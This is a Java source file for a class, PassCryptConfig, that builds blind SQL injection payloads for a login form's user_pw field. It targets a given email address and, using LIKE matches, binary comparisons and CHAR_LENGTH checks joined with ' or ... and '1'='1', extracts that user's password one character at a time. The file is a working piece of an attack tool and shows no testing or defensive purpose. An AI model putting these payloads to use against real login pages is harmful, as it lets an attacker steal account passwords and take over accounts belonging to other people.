package com.cycrypt.cfg;

public class PassCryptConfig extends CryptConfig {
	private final int MAX_LEN_PASS=64;
	
	private String email;

	public PassCryptConfig(String cyId,String email)
	{
		super(cyId);
		this.email = email;
	}
	

	public String getEmail() {
		return this.email;
	}

	public void setEmail(String email) {
		this.email = email;
	}



	@Override
	public int getMaxContetLen() {
		// TODO Auto-generated method stub
		return MAX_LEN_PASS;
	}



	@Override
	public String getContentIndexQuery(String l, int index, int contentLen) {
		// TODO Auto-generated method stub
		return getPrefixSQL()+" password like '"
		+ getContentLikeString(l, index, contentLen)
		+ "') and '1'='1";
	}



	@Override
	public String getContentInstrQuery(String l) {
		// TODO Auto-generated method stub
		return getPrefixSQL()+" binary password like '"
		+ getContentLikeString(l) + "') and '1'='1";
	}



	@Override
	public String getContentLenQuery(int len) {
		// TODO Auto-generated method stub
		return getPrefixSQL()+" CHAR_LENGTH(password) =" + len
		+ ") and '1'='1";
	}
	

	private String getPrefixSQL()
	{
		return "user_pk=" + this.email + "&user_pw=a' or (EMAIL='"
				+ this.email + "' and ";
	}
}
